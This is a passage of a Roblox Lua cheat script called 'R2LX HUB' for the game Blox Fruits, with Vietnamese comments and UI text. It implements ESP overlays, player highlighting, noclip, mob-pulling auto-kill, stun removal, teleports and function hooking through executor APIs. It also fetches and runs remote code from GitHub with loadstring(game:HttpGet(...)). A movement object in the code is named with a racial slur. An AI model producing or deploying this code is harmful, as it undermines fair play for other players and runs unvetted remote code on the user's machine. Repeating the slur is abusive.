                    bill.Name='NameEsp'
                    bill.ExtentsOffset=Vector3.new(0, 1, 0)
                    bill.Size=UDim2.new(1,200,1,30)
                    bill.Adornee=v
                    bill.AlwaysOnTop=true
                    local name = Instance.new('TextLabel',bill)
                    name.Font="Code"
                    name.FontSize="Size14"
                    name.TextWrapped=true
                    name.Size=UDim2.new(1,0,1,0)
                    name.TextYAlignment='Top'
                    name.BackgroundTransparency=1
                    name.TextStrokeTransparency=0.5
                    name.TextColor3=Color3.fromRGB(80, 245, 245)
                else
                    v['NameEsp'].TextLabel.Text=(v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' M')
                end
            end
        else
            if v:FindFirstChild('NameEsp') then
                v:FindFirstChild('NameEsp'):Destroy()
            end
        end
    end)
end
end
function UpdateAuraESP() 
for i,v in pairs(game:GetService("Workspace").NPCs:GetChildren()) do
    pcall(function()
        if AuraESP then 
            if v.Name=="Master of Enhancement" then
                if not v:FindFirstChild('NameEsp') then
                    local bill = Instance.new('BillboardGui',v)
                    bill.Name='NameEsp'
                    bill.ExtentsOffset=Vector3.new(0, 1, 0)
                    bill.Size=UDim2.new(1,200,1,30)
                    bill.Adornee=v
                    bill.AlwaysOnTop=true
                    local name = Instance.new('TextLabel',bill)
                    name.Font="Code"
                    name.FontSize="Size14"
                    name.TextWrapped=true
                    name.Size=UDim2.new(1,0,1,0)
                    name.TextYAlignment='Top'
                    name.BackgroundTransparency=1
                    name.TextStrokeTransparency=0.5
                    name.TextColor3=Color3.fromRGB(80, 245, 245)
                else
                    v['NameEsp'].TextLabel.Text=(v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' M')
                end
            end
        else
            if v:FindFirstChild('NameEsp') then
                v:FindFirstChild('NameEsp'):Destroy()
            end
        end
    end)
end
end
function UpdateLSDESP() 
for i,v in pairs(game:GetService("Workspace").NPCs:GetChildren()) do
    pcall(function()
        if LADESP then 
            if v.Name=="Legendary Sword Dealer" then
                if not v:FindFirstChild('NameEsp') then
                    local bill = Instance.new('BillboardGui',v)
                    bill.Name='NameEsp'
                    bill.ExtentsOffset=Vector3.new(0, 1, 0)
                    bill.Size=UDim2.new(1,200,1,30)
                    bill.Adornee=v
                    bill.AlwaysOnTop=true
                    local name = Instance.new('TextLabel',bill)
                    name.Font="Code"
                    name.FontSize="Size14"
                    name.TextWrapped=true
                    name.Size=UDim2.new(1,0,1,0)
                    name.TextYAlignment='Top'
                    name.BackgroundTransparency=1
                    name.TextStrokeTransparency=0.5
                    name.TextColor3=Color3.fromRGB(80, 245, 245)
                else
                    v['NameEsp'].TextLabel.Text=(v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' M')
                end
            end
        else
            if v:FindFirstChild('NameEsp') then
                v:FindFirstChild('NameEsp'):Destroy()
            end
        end
    end)
end
end
function UpdateGeaESP() 
for i,v in pairs(game:GetService("Workspace").Map.MysticIsland:GetChildren()) do 
    pcall(function()
        if GearESP then 
            if v.Name=="MeshPart" then
                if not v:FindFirstChild('NameEsp') then
                    local bill = Instance.new('BillboardGui',v)
                    bill.Name='NameEsp'
                    bill.ExtentsOffset=Vector3.new(0, 1, 0)
                    bill.Size=UDim2.new(1,200,1,30)
                    bill.Adornee=v
                    bill.AlwaysOnTop=true
                    local name = Instance.new('TextLabel',bill)
                    name.Font="Code"
                    name.FontSize="Size14"
                    name.TextWrapped=true
                    name.Size=UDim2.new(1,0,1,0)
                    name.TextYAlignment='Top'
                    name.BackgroundTransparency=1
                    name.TextStrokeTransparency=0.5
                    name.TextColor3=Color3.fromRGB(80, 245, 245)
                else
                    v['NameEsp'].TextLabel.Text=(v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' M')
                end
            end
        else
            if v:FindFirstChild('NameEsp') then
                v:FindFirstChild('NameEsp'):Destroy()
            end
        end
    end)
end
end
    
--[[    
function Click()
    task.spawn(function()
        while true do
            local player = game.Players.LocalPlayer
            local character = player and player.Character
            local humanoid = character and character:FindFirstChild("Humanoid")

            if not humanoid then 
                print("Nhân vật đã chết, dừng Auto Click!")
                break 
            end

            game:GetService("VirtualUser"):CaptureController()
            game:GetService("VirtualUser"):Button1Down(Vector2.new(1280, 672)) -- Click liên tục
            wait(0.1) -- Điều chỉnh tốc độ click
        end
    end)
end
 ]]
    
      function Click()
        game:GetService'VirtualUser':CaptureController()
    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
    end

  --[[  function Click()
    local CombatFramework = debug.getupvalues(Module)[2]
        CombatFramework.activeController.attacking = false
        CombatFramework.activeController.timeToNextAttack = 0
        CombatFramework.activeController.hitboxMagnitude = 180
        game:GetService'VirtualUser':CaptureController()
        game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
    end]]

    function AutoHaki()
  local player = game:GetService("Players").LocalPlayer
  local character = player.Character
  if character and not character:FindFirstChild("HasBuso") then
    local remote = game:GetService("ReplicatedStorage").Remotes.CommF_
    if remote then
      remote:InvokeServer("Buso") 
    end
  end
end

function UnEquipWeapon(Weapon)
        if game.Players.LocalPlayer.Character:FindFirstChild(Weapon) then
            _G.NotAutoEquip = true
            wait(.5)
            game.Players.LocalPlayer.Character:FindFirstChild(Weapon).Parent = game.Players.LocalPlayer.Backpack
            wait(.1)
            _G.NotAutoEquip = false
        end
    end
    
    function EquipWeapon(ToolSe)
        if not _G.NotAutoEquip then
            if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
                Tool = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe)
                wait(.1)
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(Tool)
            end
        end
    end
    
    spawn(function()
  pcall(function()
    while task.wait() do
    for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
    if v:IsA("Tool") then
    if v:FindFirstChild("RemoteFunctionShoot") then
    CurrentEquipGun = v.Name
    end
    end
    end
    end
    end)
  end)
  
  function StopTween(target)
    local plyr = game:GetService("Players").LocalPlayer
    local char = plyr.Character

    if not target then
        _G.StopTween = true
        wait(0.2)
        Tween(char.HumanoidRootPart.CFrame)
        wait(0.2)
        if char.HumanoidRootPart:FindFirstChild("BodyClip") then
            char.HumanoidRootPart.BodyClip:Destroy()
        end
        if char:FindFirstChild("Block") then
            char.Block:Destroy()
        end
        _G.StopTween = false
        _G.Clip = false
    end

    if char:FindFirstChild("Highlight") then
        char.Highlight:Destroy()
    end
end

function LockTween()
    if _G.LockTween then
        return
    end
    _G.LockTween = true
    wait()
    local plyr = game.Players.LocalPlayer
    local char = plyr.Character
    if char and char:IsDescendantOf(game.Workspace) then
        local hrp = char:WaitForChild("HumanoidRootPart")
        if hrp then
            hrp.CFrame = hrp.CFrame
        end
    end
    wait()
    if char:FindFirstChild("BodyClip") then
        char.BodyClip:Destroy()
    end
    if char:FindFirstChild("PartTele") then
        char.Block:Destroy()
    end
    _G.LockTween = false
end

function BringMob(huh)
    for i, v in pairs(WS.Enemies:GetChildren()) do
        if v.Name == huh and v.Parent and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and (v.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 350 then
            v.HumanoidRootPart.CFrame = BringPos
            v.Humanoid.JumpPower = 0
            v.Humanoid.WalkSpeed = 0
            v.HumanoidRootPart.Transparency = 1
            v.HumanoidRootPart.CanCollide = false
            v.Head.CanCollide = false
            if v.Humanoid:FindFirstChild("Animator") then
                v.Humanoid.Animator:Destroy()
            end
            if not v.HumanoidRootPart:FindFirstChild("Lock") then
                local lock = Instance.new("BodyVelocity")
                lock.Parent = v.HumanoidRootPart
                lock.Name = "Lock"
                lock.MaxForce = Vector3.new(100000, 100000, 100000)
                lock.Velocity = Vector3.new(0, 0, 0)
            end
            sethiddenproperty(plr, "SimulationRadius", math.huge)
            v.Humanoid:ChangeState(11)
        end
    end
end

function CancelTween23()
    if plr.Character.Head:FindFirstChild("BodyVelocity") then
        plr.Character.Head:FindFirstChild("BodyVelocity"):Destroy()
    end
    if plr.Character:FindFirstChild("PartTele") then
        plr.Character:FindFirstChild("PartTele"):Destroy()
    end
    NoClip = false
    return Tween23(plr.Character.HumanoidRootPart.CFrame)
end

function KillMob(V1, StopFunction)
    pcall(function()
        thismob = DetectMob2(V1)
        if thismob:FindFirstChild("HumanoidRootPart") and thismob.Parent and thismob:FindFirstChild("Humanoid") and thismob.Humanoid.Health > 0 then
            repeat task.wait()
                Buso()
                EquipWeapon()
                Tween23(thismob.HumanoidRootPart.CFrame * CFrame.new(0, 15, 0))
                BringPos = thismob.HumanoidRootPart.CFrame
                BringMob(V1)
                NoClip = true
            until not thismob.Parent or not thismob:FindFirstChild("Humanoid") or thismob:FindFirstChild("Humanoid").Health <= 0 or not thismob:FindFirstChild("HumanoidRootPart") or StopFunction()
            NoClip = false
            CancelTween23()
        end
    end)
end

spawn(function()
    while wait() do
        pcall(function()
            if NoClip == true then
                if not plr.Character.Head:FindFirstChild("Nigga") then
                    local Bucaccho = Instance.new("BodyVelocity", plr.Character.Head)
                    Bucaccho.P = 1500
                    Bucaccho.Name = "Nigga"
                    Bucaccho.MaxForce = Vector3.new(0, 100000, 0)
                    Bucaccho.Velocity = Vector3.new(0, 0, 0)
                end
                for i, v in pairs(plr.Character:GetDescendants()) do
                    if v:IsA("BasePart") then
                        v.CanCollide = false
                    end
                end
            else
                if plr.Character.Head:FindFirstChild("Nigga") then
                    plr.Character.Head:FindFirstChild("Nigga"):Destroy()
                end
            end
        end)
    end
end)

    
spawn(function()
    while task.wait() do
        pcall(function()
            local player = game:GetService("Players").LocalPlayer
            local character = player.Character
            local hrp = character:FindFirstChild("HumanoidRootPart")

            if character.Humanoid.Health <= 0 or not hrp then
                if character:FindFirstChild("Block") then
                    character.Block:Destroy()
                end
            end
        end)
    end
end)

spawn(function()
    while task.wait() do
        pcall(function()
            local player = game:GetService("Players").LocalPlayer
            local character = player.Character
            local hrp = character:FindFirstChild("HumanoidRootPart")

            if character:FindFirstChild("Block") then
                if (hrp.Position - character.Block.Position).Magnitude >= 100 then
                    character.Block:Destroy()
                end
            end
        end)
    end
end)

function EquipAllWeapon()
        pcall(function()
            for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                if v:IsA('Tool') and not (v.Name == "Summon Sea Beast" or v.Name == "Water Body" or v.Name == "Awakening") then
                    local ToolHumanoid = game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name) 
                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(ToolHumanoid) 
                    wait(1)
                end
            end
        end)
    end
    
function to(P)
    repeat wait()
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=P
        task.wait()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=P
    until (P.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=1000000000
end
function to(p)
        pcall(function()
            if (p.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude>=1000000000 and not Auto_Raid and game.Players.LocalPlayer.Character.Humanoid.Health>0 then
                if NameMon=="FishmanQuest" then
                    Tween(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
                    wait()
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
                elseif Mon=="God's Guard"  then
                    Tween(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
                    wait()
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-4607.82275, 872.54248,-1667.55688))
                elseif NameMon=="SkyExp1Quest" then
                    Tween(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
                    wait()
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-7894.6176757813, 5547.1416015625,-380.29119873047))
                elseif NameMon=="ShipQuest1" then
                    Tween(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
                    wait()
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                elseif NameMon=="ShipQuest2" then
                    Tween(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
                    wait()
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                elseif NameMon=="FrostQuest" then
                    Tween(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
                    wait()
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-6508.5581054688, 89.034996032715,-132.83953857422))
                else
                        repeat wait()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=p
                        wait(.05)
                        game.Players.LocalPlayer.Character.Head:Destroy()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=p
                    until (p.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<1000000000 and game.Players.LocalPlayer.Character.Humanoid.Health>0
                    wait()
                end
            end
        end)
    end

    
repeat wait() until game.Players
repeat wait() until game.Players.LocalPlayer
repeat wait() until game.ReplicatedStorage
repeat wait() until game.ReplicatedStorage:FindFirstChild("Remotes");
repeat wait() until game.Players.LocalPlayer:FindFirstChild("PlayerGui");
repeat wait() until game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main");
repeat wait() until game:GetService("Players")
repeat wait() until game:GetService("Players").LocalPlayer.Character:FindFirstChild("Energy")
if not game:IsLoaded() then repeat game.Loaded:Wait() until game:IsLoaded() end

local Plr = game.Players.LocalPlayer
local Connection = {}
local Highlight_Folder = Instance.new("Folder")
Highlight_Folder.Name = "Highlight_Folder"
Highlight_Folder.Parent = game.CoreGui
local Highlight = function(Target)
    local Highlight = Instance.new("Highlight")
    Highlight.Name = Target.Name
    Highlight.FillColor = Color3.fromRGB(200, 255, 200)
    Highlight.DepthMode = "AlwaysOnTop"
    Highlight.FillTransparency = 0.7
    Highlight.OutlineColor = Color3.fromRGB(200, 255, 200)
    Highlight.Parent = Highlight_Folder
    if Target.Character then
        Highlight.Adornee = Target.Character
    end
    Connection[Target] = Target.CharacterAdded:Connect(function(Characters)
        Highlight.Adornee = Characters
    end)
end
game.Players.PlayerAdded:Connect(Highlight)
for i, v in next, game.Players:GetPlayers() do
    Highlight(v)
end
game.Players.PlayerRemoving:Connect(function(PlayerRemove)
    if Highlight_Folder[PlayerRemove.Name] then
        Highlight_Folder[PlayerRemove.Name]:Destory()
    end
    if Connection[PlayerRemove.Name] then
        Connection[PlayerRemove.Name]:Disconnect()
    end
end)

local InputService = game:GetService("UserInputService")
InputService.WindowFocused:Connect(
    function()
        game:GetService("RunService"):Set3dRenderingEnabled(true)
    end
)
InputService.WindowFocusReleased:Connect(
    function()
        game:GetService("RunService"):Set3dRenderingEnabled(false)
    end
)

function Tween(KG)
    local Distance = (KG.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
    local Speed = 350
    local tweenInfo = TweenInfo.new(Distance / Speed, Enum.EasingStyle.Linear)
    local tween = game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, tweenInfo, {
        CFrame = KG
    })
    tween:Play()
    if _G.StopTween2 then
        tween:Cancel()
    end
    _G.Clip2 = true
    wait(Distance / Speed)
    _G.Clip2 = false
end
function BKP(Point)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Point
    task.wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Point
end
TweenSpeed = 350
function Tween(KG)
    local Distance = (KG.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
    local Speed = TweenSpeed  
    local tweenInfo = TweenInfo.new(Distance / Speed, Enum.EasingStyle.Linear)
    local tween = game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, tweenInfo, {
        CFrame = KG
    })
    tween:Play()
    if _G.StopTween then
        tween:Cancel()
    end
end

   spawn(function()
            while task.wait() do
                pcall(function()
                    if _G.AutoEvoRace or _G.CastleRaid or _G.CollectAzure or _G.TweenToKitsune or _G.GhostShip or _G.Ship or _G.Auto_Holy_Torch or _G.TeleportPly or _G.Auto_Sea3 or _G.Auto_Sea2 or _G.Tweenfruit or _G.AutoFishCrew or _G.Auto_Saber or _G.AutoShark or _G.Auto_Warden or _G.Auto_RainbowHaki or AutoFarmRace or _G.AutoQuestRace or Auto_Law or AutoTushita or _G.AutoHolyTorch or _G.AutoTerrorshark or _G.farmpiranya or _G.Auto_MusketeerHat or _G.Auto_ObservationV2 or _G.AutoNear or _G.Auto_PoleV1 or _G.Auto_Buddy or _G.Ectoplasm or AutoEvoRace or AutoBartilo or _G.Auto_Canvander or _G.AutoLevel or _G.Auto_Kill_Ply or _G.Auto_DualKatana or Auto_Quest_Yama_3 or Auto_Quest_Yama_2 or Auto_Quest_Yama_1 or Auto_Quest_Tushita_1 or Auto_Quest_Tushita_2 or Auto_Quest_Tushita_3  or _G.Clip2 or _G.Auto_Regoku or _G.AutoBone or _G.AutoBoneNoQuest or _G.AutoBoss or AutoFarmMasDevilFruit or AutoFarmMasGun or AutoHallowSycthe or AutoTushita or _G.Cake or _G.Auto_SkullGuitar or _G.AutoFarmSwan or _G.AutoEliteor or AutoNextIsland or Musketeer or _G.AutoMaterial or AutoFarmRaceQuest or _G.Factory or _G.Auto_Saw or _G.AutoFrozenDimension or _G.AutoKillTrial or _G.AutoUpgrade or _G.TweenToFrozenDimension or _G.Farmfast or _G.PlayerHunter then
                        if not game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
                            local Noclip = Instance.new("BodyVelocity")
                            Noclip.Name="BodyClip"
                            Noclip.Parent=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
                            Noclip.MaxForce=Vector3.new(100000,100000,100000)
                            Noclip.Velocity=Vector3.new(0,0,0)
                        end
                    else
                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip"):Destroy()
                    end
                end)
            end
        end)
spawn(function()
  pcall(function()
    game:GetService("RunService").Stepped:Connect(function()
      if _G.AutoEvoRace or _G.Auto_RainbowHaki or _G.Auto_SkullGuitar or _G.CastleRaid or _G.CollectAzure or _G.TweenToKitsune or _G.Auto_Sea3 or _G.Auto_Sea2 or _G.GhostShip or _G.Ship or _G.Auto_Holy_Torch or _G.TeleportPly or _G.Tweenfruit or _G.Auto_Saber or _G.Auto_PoleV1 or _G.Auto_MusketeerHat or _G.AutoFishCrew or _G.AutoShark or AutoFarmRace or _G.AutoQuestRace or _G.Auto_Warden or Auto_Law or _G.Auto_DualKatana or Auto_Quest_Tushita_1 or Auto_Quest_Tushita_2 or Auto_Quest_Tushita_3 or AutoTushita or _G.AutoHolyTorch or _G.Auto_Buddy or _G.AutoTerrorshark or _G.farmpiranya or Auto_Quest_Yama_3 or _G.Auto_ObservationV2 or Auto_Quest_Yama_2 or Auto_Quest_Yama_1 or _G.AutoNear or _G.Ectoplasm or AutoEvoRace or _G.AutoKillTrial or AutoBartilo or AutoFarmMasGun or _G.Auto_Regoku or _G.AutoLevel or _G.Auto_Kill_Ply or _G.Clip2 or _G.AutoBone or _G.Auto_Canvander or _G.AutoBoneNoQuest or _G.AutoBoss or _G.Auto_Saw or AutoFarmMasDevilFruit or AutoHallowSycthe or AutoTushita or _G.Cake or _G.AutoFarmSwan or _G.AutoEliteor or AutoNextIsland or Musketeer or _G.AutoMaterial or _G.Factory or _G.AutoFrozenDimension or AutoFarmRaceQuest or _G.AutoUpgrade or _G.TweenToFrozenDimension or _G.Farmfast or _G.PlayerHunter then
      for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
      if v:IsA("BasePart") then
      v.CanCollide=false
      end
      end
      end
      end)
    end)
  end)
  task.spawn(function()
    if game.Players.LocalPlayer.Character:FindFirstChild("Stun") then
    game.Players.LocalPlayer.Character.Stun.Changed:connect(function()
      pcall(function()
        if game.Players.LocalPlayer.Character:FindFirstChild("Stun") then
        game.Players.LocalPlayer.Character.Stun.Value=0
        end
        end)
      end)
    end
    end)

function StopTween(target)
        if not target then
            _G.StopTween = true
            wait()
            Tween(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
            wait()
            if game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip"):Destroy()
            end
            _G.StopTween = false
            _G.Clip = false
        end
    end
    
-- Bay
function CheckMaterial(matname)
for i,v in pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventory")) do
if type(v)=="table" then
if v.Type=="Material" then
if v.Name==matname then
return v.Count
end
end
end
end
return 0
end
function GetWeaponInventory(Weaponname)
for i,v in pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventory")) do
if type(v)=="table" then
if v.Type=="Sword" then
if v.Name==Weaponname then
return true
end
end
end
end
return false
end

-- AttackNoCoolDown()

Type=1
spawn(function()
    while wait() do
        if Type == 1 then
                Pos = CFrame.new(0,PosY,-20)
                wait(0.1)
                Pos = CFrame.new(-20,PosY,0)
                wait(0.1)
                Pos = CFrame.new(0,PosY,20)
                wait(0.1)
                Pos = CFrame.new(20,PosY,0)
            else
                Pos = CFrame.new(0,PosY,0)
            end
        end
    end)

spawn(function()
	while wait(0.1) do
		Type = 1
		wait(0.2)
		Type = 2
		wait(0.2)
		Type = 3
		wait(0.2)
		Type = 4
		wait(0.2)
	end
end)

--- Ui
loadstring(game:HttpGet("https://raw.githubusercontent.com/AnhEmTu/AttackNoCoolDown/refs/heads/main/AttackNoCoolDown.lua"))()
local Fluent = loadstring(game:HttpGet("https://raw.githubusercontent.com/r2lx-hub/main-r2lx-ui/refs/heads/main/fluent-mod-wibu%20.lua"))()

local ScreenGui = Instance.new("ScreenGui")
if syn then
	syn.protect_gui(ScreenGui)
end
local ImageButton = Instance.new("ImageButton")
local UICorner = Instance.new("UICorner")
local ParticleEmitter = Instance.new("ParticleEmitter")
local TweenService = game:GetService("TweenService")
local glow = Instance.new("ImageLabel")
local soundClick = Instance.new("Sound")
ScreenGui.Parent = game.CoreGui:WaitForChild("RobloxGui"):WaitForChild("Modules")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ImageButton.Parent=ScreenGui
ImageButton.BackgroundColor3=Color3.fromRGB(0, 0, 0)
ImageButton.BorderSizePixel=0
ImageButton.Position=UDim2.new(0.120833337-0.10, 0, 0.0952890813+0.01, 0)
ImageButton.Size=UDim2.new(0, 50, 0, 50)
ImageButton.Draggable=true
ImageButton.Image="http://www.roblox.com/asset/?id= 114976912682893"
UICorner.Parent=ImageButton
UICorner.CornerRadius=UDim.new(1, 10) 
ParticleEmitter.Parent=ImageButton
ParticleEmitter.LightEmission=1
ParticleEmitter.Size=NumberSequence.new({NumberSequenceKeypoint.new(0, 0.1), NumberSequenceKeypoint.new(1, 0)})
ParticleEmitter.Lifetime=NumberRange.new(0.5, 1)
ParticleEmitter.Rate=0 
ParticleEmitter.Speed=NumberRange.new(5, 10)
ParticleEmitter.Color=ColorSequence.new(Color3.fromRGB(255, 85, 255), Color3.fromRGB(85, 255, 255))
local rotateTween = TweenService:Create(ImageButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Rotation=0})
ImageButton.MouseButton1Down:Connect(function()
    ParticleEmitter.Rate=100
    task.delay(1, function()
        ParticleEmitter.Rate=0
    end)
    rotateTween:Play()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.End, false, game)
    rotateTween.Completed:Connect(function()
        ImageButton.Rotation=0
    end)
    local zoomTween = TweenService:Create(ImageButton, TweenInfo.new(0.2, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out), {Size=UDim2.new(0, 60, 0, 60)})
    zoomTween:Play()
    zoomTween.Completed:Connect(function()
        local resetZoom = TweenService:Create(ImageButton, TweenInfo.new(0.2, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out), {Size=UDim2.new(0, 50, 0, 50)})
        resetZoom:Play()
    end)
end)
task.defer(function()
    if game:GetService("ReplicatedStorage"):FindFirstChild("Effect") 
        and game:GetService("ReplicatedStorage").Effect:FindFirstChild("Container") 
        and game:GetService("ReplicatedStorage").Effect.Container:FindFirstChild("Death") then
        local DeathEffect = require(game:GetService("ReplicatedStorage").Effect.Container.Death)
        local CameraShaker = require(game:GetService("ReplicatedStorage").Util.CameraShaker)
        if CameraShaker then
            CameraShaker:Stop()
        end
        if hookfunction then
            hookfunction(DeathEffect, function(...) return ... end)
        end
    end
end)
-- Thêm hiệu ứng phát sáng
glow.Parent = b
glow.Size = UDim2.new(1.5, 0, 1.5, 0)
glow.Position = UDim2.new(-0.25, 0, -0.25, 0)
glow.BackgroundTransparency = 1
glow.Image = "rbxassetid://1174835916" -- Hình glow màu xanh dương
glow.ImageColor3 = Color3.fromRGB(255, 0, 255)
glow.ImageTransparency = 0.5

-- Âm thanh khi nhấn nút
soundClick.Parent = b
soundClick.SoundId = "rbxassetid://17779566040" -- Thay ID âm thanh click
soundClick.Volume = 1

local Window = Fluent:CreateWindow({
    Title="R2LX HUB-BloxFruit",
    SubTitle="By Enc Skibidi", 
    TabWidth=80, 
    Theme="lua",
    Acrylic=false,
    Size=UDim2.fromOffset(430, 320), 
    MinimizeKey=Enum.KeyCode.End
})
local Tabs = {
    Info=Window:AddTab({ Title="Information" }),
    Setting=Window:AddTab({ Title="Tab Setting" }),
    Main=Window:AddTab({ Title="Tab Main" }),
    Sea=Window:AddTab({ Title="Tab Event" }),
    Item=Window:AddTab({ Title="Tab Item" }),
    Status=Window:AddTab({ Title="Tab Server" }),
    Stats=Window:AddTab({ Title="Tab Index" }),
    Player=Window:AddTab({ Title="Tab Players" }),
    Teleport=Window:AddTab({ Title="Tab Teleport" }),
    Visual=Window:AddTab({ Title="Tab Fake" }),
    Fruit=Window:AddTab({ Title="Tab Fruit" }),
    Raid=Window:AddTab({ Title="Tab Raid" }),
    Race=Window:AddTab({ Title="Tab Race" }),
    Shop=Window:AddTab({ Title="Tab Shop" }),
    Misc=Window:AddTab({ Title="Tab Misc" }),
}
local Options = Fluent.Options
--- #Thông Báo
Tabs.Info:AddButton({
        Title="R2LX HUB",
        Description="Discord",
        Callback=function()
            setclipboard(tostring("https://discord.gg/xPtKpqNnfk")) 
        end
})
Tabs.Info:AddButton({
    Title="Dex Skibidi",
    Description="Youtube",
    Callback=function()
        setclipboard(tostring("https://www.youtube.com/@dex_bear"))
    end
})
Tabs.Info:AddButton({
    Title="Thinh Tran(Dex)",
    Description="Facebook",
    Callback=function()
        setclipboard(tostring("https://www.facebook.com/profile.php?id=100072575529367"))
    end
})
Tabs.Info:AddParagraph({
    Title="Phát Triển Dex",
    Content="Kĩ Năng: Thành Thạo Skid"
})
local executorName
if identifyexecutor then
    executorName=identifyexecutor()
elseif getexecutorname then
    executorName=getexecutorname()
end
if executorName then
    Tabs.Info:AddParagraph({
        Title="Client Đang Dùng",
        Content=executorName
    })
end
Tabs.Info:AddParagraph({
    Title="Cập Nhật",
    Content="Tôi Sẽ Cập Nhiều Nhiều Tính Năng Hơn Để Mang Đến Cho Các Bạn Trải Nghiệm Tốt Nhất\nNếu Có Lỗi Hãy Kiên Nhẫn Chờ Tôi Fix Vì Tôi Không Thể Thử Nghiệm Hết"
})
Tabs.Info:AddParagraph({
    Title="Các Client Android Hỗ Trợ",
    Content="Tất Cả Client Android"
})
Tabs.Info:AddParagraph({
    Title="Các Client Pc Hỗ Trợ",
    Content="Tất Cả Client Pc"
})
_G.FastAttackStrix_Mode="Super Fast Attack"
spawn(function()
    while wait() do
        if _G.FastAttackStrix_Mode then
            pcall(function()
                if _G.FastAttackStrix_Mode=="Super Fast Attack" then
                    _G.Fast_Delay=1e-2 and 0.1 
                end
            end)
        end
    end
end)

local DropdownSelectWeapon = Tabs.Setting:AddDropdown("DropdownSelectWeapon", {
    Title = "Vũ Khí",
    Description = "",
    Values = {'Melee', 'Sword', 'Blox Fruit'},
    Multi = false,
    Default = 1,
})
DropdownSelectWeapon:SetValue('Melee')
DropdownSelectWeapon:OnChanged(function(Value)
    ChooseWeapon = Value
end)
task.spawn(function()
    while wait() do
        pcall(function()
            if ChooseWeapon == "Melee" then
                for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                    if v.ToolTip == "Melee" then
                        if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
                            SelectWeapon = v.Name
                        end
                    end
                end
            elseif ChooseWeapon == "Sword" then
                for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                    if v.ToolTip == "Sword" then
                        if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
                            SelectWeapon = v.Name
                        end
                    end
                end
            elseif ChooseWeapon == "Blox Fruit" then
                for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                    if v.ToolTip == "Blox Fruit" then
                        if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
                            SelectWeapon = v.Name
                        end
                    end
                end
            end
        end)
    end
end)


    local ToggleLevel = Tabs.Main:AddToggle("ToggleLevel", {
        Title="Cày Cấp",
        Description="",
        Default=false })
    ToggleLevel:OnChanged(function(Value)
